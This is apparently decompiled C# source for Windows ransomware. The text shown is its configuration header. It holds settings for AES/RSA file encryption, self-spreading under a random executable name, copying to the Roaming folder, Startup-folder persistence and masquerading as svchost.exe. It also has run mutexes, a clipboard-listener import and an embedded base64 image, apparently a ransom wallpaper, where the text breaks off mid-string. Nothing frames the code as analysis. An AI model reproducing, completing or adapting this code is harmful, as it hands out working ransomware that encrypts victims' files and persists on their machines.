using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "CCeLUYbrxgDKhjFyogxqNNANgqZozYAyyDnPgapemNdmmzTMeTEeHSctBnadSezajyJPuEVHTzaDwXdWbFRwkGzUQxPyRcjMYLEWYJckKTpyqnAPvdgzEBZErUTAJjut.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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